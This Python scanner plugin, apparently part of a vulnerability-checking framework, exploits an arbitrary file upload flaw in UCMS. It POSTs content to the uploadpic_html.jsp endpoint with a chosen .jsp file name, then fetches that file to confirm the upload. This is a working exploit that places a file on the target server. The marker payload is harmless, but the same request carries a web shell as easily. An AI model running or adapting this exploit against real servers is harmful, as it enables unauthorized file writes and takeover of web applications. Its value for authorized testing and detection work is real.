#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'


import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()


def get_script_info(data=None):
    script_info = {
        "name": "ucms upload",
        "info": "ucms upload.",
        "level": "high",
        "type": "info"
    }
    return script_info

def prove(data):
    xmldata = '''
    <?xml version="1.0" encoding="UTF-8"?>
    <root>
    dGVzdCBieSBtZQ==
    </root>
    '''
    data = init(data,'web')
    if data['base_url']:
        for url in [data['base_url'], data['url']]:
            try:
                myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
                res = requests.post(myurl, headers=data['headers'],data = xmldata,verify=False,timeout=data['timeout'])
            except Exception as e:
                res = None
            if res != None and res.status_code is 200:
                try:
                    myurl = url + '/ucms/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                    testres = requests.post(myurl, headers=data['headers'], data=xmldata, verify=False,
                                        timeout=data['timeout'])
                except:
                    testres = None
                if testres != None and 'test by me' in testres.text:
                    data['flag'] = 1
                    data['data'].append({"page": myurl})
                    data['res'].append({"info": myurl, "key": "ucms upload"})
    return data